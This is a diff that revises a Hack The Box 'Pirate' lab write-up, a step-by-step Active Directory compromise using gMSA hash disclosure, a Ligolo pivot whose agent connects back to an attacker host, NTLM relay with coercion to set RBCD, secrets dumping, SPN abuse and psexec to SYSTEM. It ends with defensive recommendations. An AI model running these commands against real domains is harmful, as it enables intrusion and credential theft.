@@ -1,5 +1,5 @@
 ---
-title: "Pirate: AD Chain from Time Skew to Domain Controller Compromise"
+title: "Pirate — gMSA Disclosure, NTLM-Relay RBCD, and SPN Abuse to Domain Controller"
 description: "Kerberos clock-skew alignment, gMSA enumeration, and an NTLM relay pivot lead through delegation abuse to domain controller compromise."
 type: case-study
 platform: Hack The Box
@@ -14,57 +14,95 @@ tags:
   - rbcd
   - ntlm-relay
   - ligolo
+objective: "Chain supplied domain credentials through gMSA disclosure, an NTLM-relay pivot, and delegation abuse to administrative control of the domain controller."
+tools:
+  - rustscan
+  - netexec
+  - rusthound-ce
+  - rdate
+  - evil-winrm
+  - ligolo-ng
+  - impacket
+  - coercer
+  - bloodyAD
+skill: "Active Directory trust-path analysis across gMSA disclosure, NTLM relay, resource-based constrained delegation, and SPN abuse"
+outcome: "SYSTEM-level execution on the domain controller after RBCD delegation and SPN-abuse service-ticket pivoting"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Hard |
+| Target environment | Windows Active Directory domain controller with an internal `/24` network segment hosting a web host |
+| Starting position | Supplied domain credentials for a low-privileged user |
+| Objective | Chain supplied credentials, a gMSA disclosure, an NTLM-relay pivot, and delegation abuse to administrative control of the domain controller |
+| Outcome | SYSTEM-level execution on the domain controller |
 
 ## Summary
 
-Pirate is a Hack The Box Hard Active Directory lab starting with supplied domain credentials. LDAP enumeration is initially blocked by Kerberos clock skew. After time alignment, `pre2k` and gMSA enumeration expose machine and service-account material leading to a WinRM foothold on the domain controller. An internal network segment contains a web host. A Ligolo pivot plus NTLM relay grants delegation rights, allowing administrator impersonation to recover additional credentials, followed by password resets and SPN abuse to compromise the domain controller. All target-specific identifiers, IPs, credentials, and hashes are replaced with placeholders throughout.
+Pirate is a Hard-rated Hack The Box Active Directory lab that begins with supplied credentials for a low-privileged domain user. LDAP enumeration is initially blocked by Kerberos clock skew; once the clocks are aligned, `pre2k` and gMSA enumeration expose a managed service account whose NTLM hash yields a WinRM foothold on the domain controller. Local discovery reveals an internal `/24` segment hosting a web host, a Ligolo tunnel reaches it, and an NTLM relay to LDAPS grants the delegation rights needed to impersonate an administrator, recover a local secret, reset a privileged account's password, and pivot a service ticket to the domain controller. Target and attacker addresses, hostnames, account names, credentials, and hashes are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Supplied domain credentials → Kerberos clock-skew alignment → `pre2k` and gMSA disclosure → WinRM foothold → internal segment discovery → Ligolo pivot → NTLM-relay RBCD → delegated CIFS ticket → local secret recovery → privileged password reset → SPN abuse → domain controller SYSTEM**
 
 ## Context and Objective
 
-The lab presents a Windows domain controller running DNS, Kerberos, LDAP, WinRM, and IIS. Supplied credentials allow LDAP and SMB enumeration. The objective is to identify and chain trust relationships across the domain and an internal network segment to reach domain administrator access on the domain controller.
+- **Target:** a Windows Active Directory domain controller exposing DNS, Kerberos, LDAP, SMB, IIS (HTTP), and WinRM.
+- **Starting position:** supplied credentials for `<INITIAL_USER>`, a low-privileged domain account.
+- **Internal segment:** a `/24` network reachable only through the domain controller, hosting `<INTERNAL_WEB_HOSTNAME>`.
+- **Objective:** chain trust relationships across the domain and the internal segment to reach domain administrative control.
+- **Constraints:** activity was confined to the Hack The Box lab environment; the lab hostname was mapped locally for name resolution.
 
 ## Approach and Evidence
 
-### Port Scanning
+### 1. Service Enumeration
 
-The initial scan identified the host as a domain controller.
+Observation: a full TCP scan identifies the host as a domain controller and exposes a web service alongside the directory services.
 
 ```bash
-rustscan -a <TARGET> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
+rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
+```
+
+Truncated scan output:
+
+```text
+53/tcp   open  domain         Simple DNS Plus
+80/tcp   open  http           Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec   Microsoft Windows Kerberos
+389/tcp  open  ldap           Microsoft Windows Active Directory LDAP
+445/tcp  open  microsoft-ds
+5985/tcp open  http           Microsoft HTTPAPI httpd 2.0
+```
+
+Significance: DNS, Kerberos, and LDAP together with WinRM (5985) identify a domain controller; port 80 exposes an IIS service that is enumeration-only, while WinRM provides the credential-based foothold.
+
+Result: a Windows domain controller is enumerated, with WinRM available for a later credential-based foothold.
+
+### 2. SMB Enumeration and Domain User Discovery
+
+Observation: the supplied credentials authenticate over SMB, but the exposed shares are limited to the default set.
+
+```bash
+nxc smb <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' --shares
 ```
 
 ```text
-53/tcp   open  domain        Simple DNS Plus
-80/tcp   open  http          Microsoft IIS httpd 10.0
-88/tcp   open  kerberos-sec   Microsoft Windows Kerberos
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
-445/tcp  open  microsoft-ds
-464/tcp  open  kpasswd5
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
-3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
-9389/tcp open  mc-nmf        .NET Message Framing
+ADMIN$
+C$
+IPC$      READ
+NETLOGON  READ
+SYSVOL    READ
 ```
 
-The hostname was added to the local hosts file for name resolution.
+Significance: valid low-privileged credentials grant read access to `SYSVOL` and `NETLOGON` but no read access to the administrative shares (`ADMIN$`, `C$`), so the foothold has to come from directory data.
 
-```bash
-echo '<TARGET_IP> <DOMAIN_CONTROLLER_HOSTNAME> <TARGET_DOMAIN>' | sudo tee -a /etc/hosts
-```
+Result: authentication with the supplied credentials is confirmed over SMB.
 
-### SMB Enumeration and User Discovery
-
-The supplied credentials validated over SMB but the exposed shares were minimal. RID brute forcing enumerated the domain user list.
+RID brute forcing then enumerates the domain user list:
 
 ```bash
 nxc smb <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' --rid-brute \
-  | awk '/SidTypeUser/' \
-  | awk '{print $6}' \
-  | awk -F'\\' '{print $2}' > users.txt
+  | awk '/SidTypeUser/' | awk '{print $6}' | awk -F'\\' '{print $2}' > users.txt
 ```
 
 ```text
@@ -77,31 +115,37 @@ krbtgt
 <INTERNAL_WEB_MACHINE_ACCOUNT>
 ```
 
-Two domain user accounts were of interest for later stages.
+Significance: the enumerated names include a privileged user and a standard user that later holds a password-reset right.
 
-### Kerberos Time Skew and pre2k Enumeration
+Result: `<PRIVILEGED_USER>` and `<STANDARD_USER>` are identified for later stages.
 
-LDAP enumeration of pre-created computer accounts initially failed with `KRB_AP_ERR_SKEW`. The recorded output shows clock skew errors for the target domain.
+### 3. Kerberos Clock Skew and `pre2k` Enumeration
+
+Observation: LDAP enumeration of pre-created computer accounts fails because the local clock and the domain controller are out of sync.
 
 ```bash
 nxc ldap <TARGET_DOMAIN> -u '<INITIAL_USER>' -p '<SUPPLIED_PASSWORD>' -M pre2k
 ```
 
 ```text
-[-] Error obtaining TGT for <PRECREATED_COMPUTER>@<TARGET_DOMAIN>: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+[-] Error obtaining TGT for <CONTROLLED_COMPUTER_ACCOUNT>@<TARGET_DOMAIN>: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-Time synchronization resolved the issue:
+Action: align the local clock with the domain controller and repeat the enumeration.
 
 ```bash
 sudo rdate -n <TARGET_DOMAIN>
 ```
 
 ```text
-[+] Successfully obtained TGT for <PRECREATED_COMPUTER>@<TARGET_DOMAIN>
+[+] Successfully obtained TGT for <CONTROLLED_COMPUTER_ACCOUNT>@<TARGET_DOMAIN>
 ```
 
-A dedicated Kerberos configuration file was used to scope authentication to the target domain. BloodHound collection and gMSA enumeration followed.
+Significance: Kerberos rejects tickets when the client clock deviates beyond the realm's skew tolerance, so time alignment restores authentication without any credential change.
+
+Result: TGT acquisition succeeds and directory enumeration proceeds; obtaining the ticket establishes control of the pre-created machine account, which is the same account later used as `<CONTROLLED_COMPUTER_ACCOUNT>` in the delegation stage.
+
+BloodHound collection and gMSA enumeration follow using the obtained ticket cache:
 
 ```bash
 rusthound-ce -d '<TARGET_DOMAIN>' -f '<DOMAIN_CONTROLLER_HOSTNAME>' -i '<TARGET_IP>' -k -z
@@ -109,24 +153,36 @@ nxc ldap <TARGET_DOMAIN> --use-kcache --gmsa
 ```
 
 ```text
-LDAP  <TARGET_DOMAIN>  389  <DOMAIN_CONTROLLER>  Account: <GMSA_ACCOUNT>  NTLM: <GMSA_NTLM_HASH>  PrincipalsAllowedToReadPassword: <AUTHORIZED_GROUP>
+LDAP  <TARGET_DOMAIN>  389  <DOMAIN_CONTROLLER_HOSTNAME>  Account: <GMSA_ACCOUNT>  NTLM: <GMSA_NTLM_HASH>  PrincipalsAllowedToReadPassword: <AUTHORIZED_GROUP>
 ```
 
-The gMSA account was selected as the initial foothold. Its NTLM hash was usable for authentication without knowing the plaintext password — a characteristic of Group Managed Service Accounts where the hash is distributed to authorized principals.
+Significance: a group Managed Service Account's password is distributed as an NTLM hash to the principals named in `PrincipalsAllowedToReadPassword`; the recorded enumeration read it directly, so the hash becomes usable for authentication without knowing the plaintext.
 
-### WinRM Foothold as gMSA Account
+Result: the NTLM hash of `<GMSA_ACCOUNT>` is recovered.
 
-The gMSA hash validated over WinRM:
+### 4. WinRM Foothold and Internal Segment Discovery
+
+Observation: the recovered gMSA hash authenticates over WinRM.
 
 ```bash
 nxc winrm <TARGET_DOMAIN> -u '<GMSA_ACCOUNT>' -H '<GMSA_NTLM_HASH>'
 ```
 
 ```text
-WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER>  [+] <TARGET_DOMAIN>\<GMSA_ACCOUNT>:<GMSA_NTLM_HASH> (Pwn3d!)
+WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER_HOSTNAME>  [+] <TARGET_DOMAIN>\<GMSA_ACCOUNT>:<GMSA_NTLM_HASH> (Pwn3d!)
 ```
 
-An interactive shell was established. Local network discovery revealed an internal segment:
+An interactive shell follows:
+
+```bash
+evil-winrm -i <DOMAIN_CONTROLLER_HOSTNAME> -u '<GMSA_ACCOUNT>' -H '<GMSA_NTLM_HASH>'
+```
+
+Significance: the `Pwn3d!` marker indicates the managed account has administrative remote access, so its hash yields an interactive session on the domain controller.
+
+Result: an administrative WinRM session as `<GMSA_ACCOUNT>` is established.
+
+Local network discovery from that session reveals a second segment:
 
 ```powershell
 ipconfig /all
@@ -135,53 +191,63 @@ arp -a
 
 ```text
 Ethernet adapter vEthernet (Switch01):
-   IPv4 Address. . . . . . . . . . . : <TARGET_IP>(Preferred)
+   IPv4 Address. . . . . . . . . . . : <INTERNAL_DC_IP>(Preferred)
 
-<INTERNAL_HOST_IP>     00-15-5d-0b-d0-02     dynamic
+<INTERNAL_WEB_IP>     <INTERNAL_WEB_MAC>     dynamic
 ```
 
-The host at `<INTERNAL_HOST_IP>` was identified as an internal web host, accessible only from within the lab network.
+Significance: the domain controller has a second adapter on an internal `/24` network that is not directly routable from the attack host, so `<INTERNAL_WEB_HOSTNAME>` can only be reached through a tunnel.
 
-### Ligolo Pivot to Internal Segment
+Result: `<INTERNAL_WEB_HOSTNAME>` at `<INTERNAL_WEB_IP>` is identified as the next target.
 
-A Ligolo tunnel was established to reach the internal network. The proxy was started on the attacker machine, and the agent was deployed on the domain controller.
+### 5. Ligolo Pivot to the Internal Segment
+
+Observation: the internal web host is not directly reachable, so a tunnel is established through the domain controller.
+
+Action: run the Ligolo proxy on the attack host, deploy the agent on the domain controller, then add a route to the internal network in the proxy session.
 
 ```bash
 ~/Tools/Ligolo-ng/proxy --selfcert
 ```
 
 ```powershell
-curl -o agent.exe <REMOTE_BINARY>
-./agent.exe --connect [attacker]:11601 --ignore-cert
+curl -o agent.exe <AGENT_URL>
+./agent.exe --connect <ATTACKER_HOST>:<LIGOLO_PORT> --ignore-cert
 ```
 
 ```text
-INFO[0100] Starting tunnel to <TARGET_DOMAIN>\<GMSA_ACCOUNT>@<DOMAIN_CONTROLLER>
+INFO[0100] Starting tunnel to <TARGET_DOMAIN>\<GMSA_ACCOUNT>@<DOMAIN_CONTROLLER_HOSTNAME>
 ```
 
-Reachability to the internal host was confirmed:
+Reachability to the internal host is then confirmed through the tunnel:
 
 ```bash
-ping <INTERNAL_HOST_IP>
+ping <INTERNAL_WEB_IP>
 ```
 
 ```text
-64 bytes from <INTERNAL_HOST_IP>: icmp_seq=1 ttl=64 time=232 ms
+64 bytes from <INTERNAL_WEB_IP>: icmp_seq=1 ttl=64 time=232 ms
 ```
 
-### RBCD Delegation Abuse on Internal Web Host
+Significance: with a route through the agent, the attack host can address the internal segment directly, turning the domain controller into a pivot point.
 
-The attack used NTLM relay to grant Resource-Based Constrained Delegation rights. Coerced authentication from the internal web host was relayed to LDAPS, modifying its delegation attribute to allow a controlled computer account to impersonate users via S4U2Proxy.
+Result: `<INTERNAL_WEB_IP>` is reachable through the tunnel.
+
+### 6. NTLM-Relay RBCD and Delegated CIFS Ticket
+
+Observation: the internal web host authenticates to the domain over LDAP, and its delegation attribute can be rewritten through a relayed coercion.
+
+Action: relay coerced authentication from the web host to LDAPS and grant delegation rights to a controlled computer account.
 
 ```bash
-impacket-ntlmrelayx -t ldaps://<TARGET> \
+impacket-ntlmrelayx -t ldaps://<TARGET_IP> \
   --delegate-access \
   --escalate-user '<CONTROLLED_COMPUTER_ACCOUNT>' \
   -smb2support \
   --remove-mic
 
 coercer coerce -u '<GMSA_ACCOUNT>' --hashes ':<GMSA_NTLM_HASH>' \
-  -d <TARGET_DOMAIN> -l <ATTACKER_IP> -t <INTERNAL_HOST_IP> --always-continue
+  -d <TARGET_DOMAIN> -l <ATTACKER_HOST> -t <INTERNAL_WEB_IP> --always-continue
 ```
 
 ```text
@@ -189,7 +255,11 @@ coercer coerce -u '<GMSA_ACCOUNT>' --hashes ':<GMSA_NTLM_HASH>' \
 [*] ldaps://<TARGET_DOMAIN>/<INTERNAL_WEB_MACHINE_ACCOUNT>@<TARGET_IP> [1] -> <CONTROLLED_COMPUTER_ACCOUNT> can now impersonate users via S4U2Proxy
 ```
 
-With delegation rights granted, a service ticket was requested impersonating an administrator for the `CIFS` service on the internal web host:
+Significance: relayed authentication to LDAPS lets the attacker write the web host's resource-based constrained delegation attribute, so the controlled computer account can obtain service tickets impersonating arbitrary users on that host.
+
+Result: `<CONTROLLED_COMPUTER_ACCOUNT>` gains S4U2Proxy impersonation rights over `<INTERNAL_WEB_HOSTNAME>`.
+
+With delegation in place, a service ticket impersonating an administrator is requested for the `CIFS` service on the internal web host:
 
 ```bash
 impacket-getST <TARGET_DOMAIN>/'<CONTROLLED_COMPUTER_ACCOUNT>' \
@@ -204,14 +274,20 @@ impacket-getST <TARGET_DOMAIN>/'<CONTROLLED_COMPUTER_ACCOUNT>' \
 [*] Saving ticket in <ADMINISTRATOR_ACCOUNT>@cifs_<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN>.ccache
 ```
 
-The ticket was used to dump local secrets from the internal web host:
+Significance: a delegated service ticket carries the administrator's identity to the `CIFS` service, so it can be presented for administrative access to the web host.
+
+Result: an administrator-impersonating CIFS ticket for `<INTERNAL_WEB_HOSTNAME>` is obtained.
+
+### 7. Local Secret Recovery from the Internal Web Host
+
+Observation: the delegated ticket authorizes secrets extraction from the web host.
 
 ```bash
 export KRB5CCNAME=<ADMINISTRATOR_ACCOUNT>@cifs_<INTERNAL_WEB_HOSTNAME>@<TARGET_DOMAIN>.ccache
-impacket-secretsdump -k -no-pass -target-ip <INTERNAL_HOST_IP> <INTERNAL_WEB_HOSTNAME>
+impacket-secretsdump -k -no-pass -target-ip <INTERNAL_WEB_IP> <INTERNAL_WEB_HOSTNAME>
 ```
 
-The LSA secrets dump revealed a reusable local password for a domain account:
+The LSA secrets dump discloses a reusable local password for a domain account:
 
 ```text
 [*] Dumping LSA Secrets
@@ -219,19 +295,29 @@ The LSA secrets dump revealed a reusable local password for a domain account:
 <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
 ```
 
-Credential validation:
+Significance: a password kept as `DefaultPassword` in LSA secrets is a reusable credential for `<STANDARD_USER>` rather than a machine-bound secret, so it crosses from the host into the domain.
+
+Result: a credential pair for `<STANDARD_USER>` is recovered.
+
+The recovered credential is then validated against the web host over SMB:
 
 ```bash
-nxc smb <INTERNAL_HOST_IP> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
+nxc smb <INTERNAL_WEB_IP> -u '<STANDARD_USER>' -p '<STANDARD_USER_PASSWORD>'
 ```
 
 ```text
-SMB  <INTERNAL_HOST_IP>  445  <INTERNAL_WEB_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
+SMB  <INTERNAL_WEB_IP>  445  <INTERNAL_WEB_HOSTNAME>  [+] <TARGET_DOMAIN>\<STANDARD_USER>:<STANDARD_USER_PASSWORD>
 ```
 
-### Password Reset and SPN Abuse for Domain Controller Compromise
+Significance: successful authentication confirms the recovered secret is valid for the domain account.
 
-The standard user account had permission to reset a privileged account. A password reset was performed:
+Result: `<STANDARD_USER>` is validated over SMB.
+
+### 8. Password Reset and SPN Abuse to Domain Controller
+
+Observation: `<STANDARD_USER>` holds a password-reset right over `<PRIVILEGED_USER>`.
+
+Action: reset the privileged account's password.
 
 ```bash
 bloodyAD --host '<TARGET_IP>' -d <TARGET_DOMAIN> \
@@ -243,7 +329,11 @@ bloodyAD --host '<TARGET_IP>' -d <TARGET_DOMAIN> \
 [+] Password changed successfully!
 ```
 
-An SPN was added to the domain controller machine account to impersonate the HTTP service on the internal web host, then a service ticket was requested using the `altservice` flag to pivot the ticket to CIFS on the domain controller:
+Significance: the password-reset right transfers control of `<PRIVILEGED_USER>` to the attacker without any further exploit.
+
+Result: `<PRIVILEGED_USER>` credentials are changed to a known value.
+
+An SPN is then written to the domain controller's machine account, and a service ticket is requested with an alternate service to pivot it from HTTP to CIFS on the domain controller:
 
 ```bash
 python3 addspn.py -u '<TARGET_DOMAIN>\<PRIVILEGED_USER>' -p '<RESET_PASSWORD>' \
@@ -263,33 +353,52 @@ impacket-getST -spn 'HTTP/<INTERNAL_WEB_HOSTNAME>' \
 [*] Saving ticket in <ADMINISTRATOR_ACCOUNT>@CIFS_<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>.ccache
 ```
 
-The final ticket was used to obtain a SYSTEM shell on the domain controller:
+Significance: write access to the machine account's SPNs permits S4U2self/S4U2Proxy service-ticket issuance, and the `altservice` pivot retargets the impersonated ticket from HTTP to CIFS on the domain controller.
+
+Result: an administrator-impersonating CIFS ticket for the domain controller is obtained.
+
+The final ticket is used to execute on the domain controller:
 
 ```bash
 export KRB5CCNAME=<ADMINISTRATOR_ACCOUNT>@CIFS_<DOMAIN_CONTROLLER_HOSTNAME>@<TARGET_DOMAIN>.ccache
 impacket-psexec -k -no-pass <DOMAIN_CONTROLLER_HOSTNAME>
 ```
 
-The shell landed as `<SYSTEM_ACCOUNT>` on the domain controller. The `<PRIVILEGED_RESULT>` was recovered.
+Result: the session lands in the `<SYSTEM_ACCOUNT>` context on the domain controller.
 
 ## Challenges and Decisions
 
-- **Kerberos clock skew** blocked initial `pre2k` enumeration. The fix was time synchronization with `rdate`, after which TGT acquisition succeeded. This is a common operational issue in lab environments where the attacker machine clock drifts.
-- **Internal network isolation**: The internal web host was only reachable through the domain controller's internal adapter. A Ligolo tunnel was necessary before any direct interaction.
-- **Credential discovery from LSA secrets**: A password stored in the internal web host's `DefaultPassword` provided cross-service credential material, enabling the final privilege escalation chain.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| Kerberos clock skew blocked `pre2k` enumeration | Synchronized the local clock with `rdate` before retrying | Kerberos rejects tickets when the client is outside the realm's skew tolerance |
+| The internal `/24` segment was not directly routable | Reached it through a Ligolo tunnel via the domain controller | The web host is reachable only from the domain controller's internal adapter |
 
 ## Outcome
 
-The notes establish a documented path from supplied domain credentials through time-skew resolution, gMSA exploitation, internal pivoting, RBCD delegation abuse, credential recovery, SPN manipulation, and finally domain administrator access. All outcomes are reported by the source; specific target IPs, credentials, and hashes are excluded.
+The evidence establishes administrative compromise of the domain: an administrator-impersonating CIFS ticket was issued by the domain controller and used to execute in its `<SYSTEM_ACCOUNT>` context. Limitations: the final session's command output was not retained, so the landing context rests on the source's record, and the recovered secret values and the flag are omitted.
 
 ## Lessons and Recommendations
 
-- Keep Kerberos time synchronized and monitor for `KRB_AP_ERR_SKEW`, because time drift disrupts account enumeration and Kerberos authentication.
-- Restrict which principals can read gMSA passwords and audit `PrincipalsAllowedToReadPassword` regularly. Any account that can read a gMSA password effectively becomes a service account with broad trust.
-- Remove or tightly limit NTLM relay opportunities on internal LDAP/LDAPS services. LDAP signing and channel binding reduce coercion-based attack impact.
-- Treat machine account SPN write access as a critical privilege. SPN manipulation can turn into constrained delegation and service-ticket abuse.
-- Avoid storing reusable plaintext passwords in machine secrets or local configuration. The `DefaultPassword` recovered from the internal web host was sufficient to continue the attack chain.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. These actions are recommendations; none was validated in the lab.
+
+1. **Kerberos time synchronization.** Time drift produced `KRB_AP_ERR_SKEW` and blocked account enumeration. *Recommendation:* keep domain controllers and management hosts synchronized to a reliable time source. *Detection:* monitor for `KRB_AP_ERR_SKEW` events.
+2. **Over-broad gMSA read permission.** A principal listed in `PrincipalsAllowedToReadPassword` retrieved the managed account's NTLM hash directly, yielding a WinRM foothold. *Recommendation:* restrict `PrincipalsAllowedToReadPassword` to the minimum identities that require it and review it regularly. *Detection:* monitor gMSA password reads and changes to those ACLs.
+3. **NTLM relay to LDAPS with weakly protected delegation.** Relaying coerced host authentication to LDAPS modified the web host's delegation attribute, enabling administrator impersonation via S4U2Proxy. *Recommendation:* enforce LDAP signing and channel binding, disable NTLM where possible, and restrict write access to machine-account delegation attributes. *Detection:* alert on modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity` and on LDAP binds that follow coercion.
+4. **Reusable plaintext secret in LSA secrets.** A `DefaultPassword` stored on the web host provided a usable domain credential. *Recommendation:* avoid storing reusable account passwords in machine secrets or local configuration; where unavoidable, rotate and scope them. *Detection:* scan hosts for stored credentials and alert on unusual service-account use.
+5. **Machine-account SPN write access.** Write access to the domain controller machine account's SPNs allowed S4U2self/S4U2Proxy ticket issuance, pivoted to `CIFS` with the `altservice` option. *Recommendation:* treat SPN write access on privileged computer accounts as tier-zero and restrict it. *Detection:* alert on SPN modifications to domain controller machine accounts and on anomalous service-ticket requests.
 
 ## References
 
-- Hack The Box, [Pirate](https://app.hackthebox.com/machines/Pirate) machine.
+- [Hack The Box — Pirate](https://app.hackthebox.com/machines/Pirate) (retired machine)
+- [NetExec (`nxc`)](https://github.com/Pennyw0rth/NetExec) (SMB, LDAP, gMSA, and WinRM operations)
+- [Impacket](https://github.com/fortra/impacket) (NTLM relay, service-ticket, secrets-dump, and PsExec clients)
+- [Coercer](https://github.com/p0dalirius/Coercer) (authentication coercion)
+- [bloodyAD](https://github.com/cravaterouge/bloodyAD) (Active Directory privilege and password operations)
+- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) (network tunnel)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
+- [RustScan](https://github.com/bee-san/RustScan) (port scanner)
+- [Group Managed Service Accounts overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
+- [Kerberos authentication overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
+- [LDAP signing for Active Directory Domain Services — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing)
+- [Network security: Restrict NTLM: NTLM authentication in this domain — Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)
+- [msDS-AllowedToActOnBehalfOfOtherIdentity attribute — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)
